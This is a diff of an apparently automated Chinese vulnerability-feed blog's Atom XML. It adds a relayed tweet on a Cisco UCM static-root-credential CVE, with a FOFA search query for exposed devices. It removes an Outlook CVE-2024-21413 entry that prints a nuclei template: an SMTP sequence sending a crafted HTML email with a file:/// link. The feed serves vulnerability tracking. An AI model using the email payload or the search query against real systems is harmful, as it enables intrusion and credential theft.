@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-03T06:30:22.398Z</updated>
+  <updated>2025-07-03T07:00:28.172Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>fofabot twitter update</title>
+    <link href="http://example.com/2025/07/03/twitter_973494131/"/>
+    <id>http://example.com/2025/07/03/twitter_973494131/</id>
+    <published>2025-07-03T07:00:28.000Z</published>
+    <updated>2025-07-03T07:00:28.172Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> fofabot</p><p><strong>推文：</strong> ⚠️⚠️CVE-2025-20309 （CVSS 10分）该漏洞使受影响设备面临通过静态根凭证未经认证的远程访问风险——这些凭证无法更改或删除。<br>🎯在<a href="https://t.co/uLIbgJcaq5%E4%B8%8A%E5%8F%91%E7%8E%B0%E8%BF%91%E5%8D%83%E6%9D%A1%E7%BB%93%E6%9E%9C">https://t.co/uLIbgJcaq5上发现近千条结果</a><br>🔗FOFA链接：<a href="https://t.co/YiLcpoXPSx">https://t.co/YiLcpoXPSx</a><br>FOFA查询：app&#x3D;”CISCO-UCM”<br>🔖参考：<a href="https://t.co/nlghqQeAvB">https://t.co/nlghqQeAvB</a><br>#开源情报 #FOFA #网络安全 #漏洞</p><p><strong>链接：</strong> <a href="https://x.com/fofabot/status/1940662311565644183">https://x.com/fofabot/status/1940662311565644183</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; fofabot&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; ⚠️⚠️CVE-2025-20309 （CVSS 10分）该漏洞使受影响设备面临通过静态根凭证未经认证的远程访问风险——这些凭证无法更改或删除。&lt;br&gt;🎯在&lt;</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="fofabot" scheme="http://example.com/tags/fofabot/"/>
+    
+  </entry>
   
   <entry>
     <title>JEHC-BPM Remote Code Execute Vulnerability</title>
@@ -507,32 +532,6 @@
       
     <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Microsoft Outlook 远程代码执行漏洞&lt;/p&gt;
 &lt;p&gt;&lt;stro</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Microsoft Outlook 远程代码执行漏洞 - CVE-2024-21413</title>
-    <link href="http://example.com/2025/07/02/github_78228618/"/>
-    <id>http://example.com/2025/07/02/github_78228618/</id>
-    <published>2025-07-02T20:45:13.728Z</published>
-    <updated>2025-07-02T20:45:13.725Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Microsoft Outlook 远程代码执行漏洞 - CVE-2024-21413</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-21413</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Microsoft Outlook 远程代码执行漏洞。成功利用此漏洞的攻击者可以绕过Office Protected View，并以编辑模式而非保护模式打开文件。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> 365_apps</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/adb7d9a749d4ad2754d90d091a1ebcf05db692e4/network%2Fcves%2F2024%2FCVE-2024-21413.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/adb7d9a749d4ad2754d90d091a1ebcf05db692e4/network%2Fcves%2F2024%2FCVE-2024-21413.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">21413</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Microsoft Outlook Remote Code Execution Vulnerability <span class="hljs-operator">-</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">21413</span><br>  <span class="hljs-params">author:</span> redperfect1847<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Microsoft Outlook Remote Code Execution Vulnerability. Successful exploitation of this vulnerability would allow an attacker to bypass the Office Protected View and open <span class="hljs-keyword">in</span> editing mode rather than protected mode.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/duy-31/CVE-2024-21413</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">21413</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">20</span>,NVD-CWE-noinfo<br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.93681</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99836</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:microsoft:<span class="hljs-number">365</span>_apps:-:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:enterprise:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">vendor:</span> microsoft<br>    <span class="hljs-params">product:</span> <span class="hljs-number">365</span>_apps<br>  <span class="hljs-params">tags:</span> cve, cve2024, microsoft,kev<br><span class="hljs-params">tcp:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;HELO &#123;&#123;Hostname&#125;&#125;<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;MAIL FROM:&lt;&#123;&#123;from&#125;&#125;&gt;<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;RCPT TO:&lt;&#123;&#123;rcpt&#125;&#125;&gt;<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;DATA<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> |<br>          <span class="hljs-params">From:</span> <span class="hljs-operator">&lt;</span>&#123;&#123;from&#125;&#125;<span class="hljs-operator">&gt;</span><br>          <span class="hljs-params">To:</span> <span class="hljs-operator">&lt;</span>&#123;&#123;rcpt&#125;&#125;<span class="hljs-operator">&gt;</span><br>          <span class="hljs-params">Subject:</span> Rdv important (evil inside)<br>          <span class="hljs-params">Mime-Version:</span> <span class="hljs-number">1.0</span><br>          <span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/alternative</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span>test<br><br>          <span class="hljs-operator">-</span>-test<br>          <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>us-ascii<br><br>          This should be read <span class="hljs-keyword">in</span> HTML<br>          <span class="hljs-operator">-</span>-test<br>          <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/html</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>ISO-<span class="hljs-number">885</span>9-<span class="hljs-number">1</span><br><br>          <span class="hljs-symbol">&lt;html&gt;</span><br>          <span class="hljs-symbol">&lt;body&gt;</span><br>          <span class="hljs-symbol">&lt;h1&gt;</span><span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;file:///&#123;&#123;url&#125;&#125;&quot;</span><span class="hljs-operator">&gt;</span>Meeting <span class="hljs-operator">-</span> click here.<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>h1<span class="hljs-operator">&gt;</span><br>          <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>body<span class="hljs-operator">&gt;</span><br>          <span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>html<span class="hljs-operator">&gt;</span><br>          <span class="hljs-operator">-</span>-test--\r\n.<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;QUIT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span><br><br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">25</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;220&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;250&quot;</span><br>        <span class="hljs-params">part:</span> all<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Meeting - click here.&quot;</span><br>        <span class="hljs-params">part:</span> all<br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Microsoft Outlook 远程代码执行漏洞 - CVE-2024-2</summary>
       
     
     
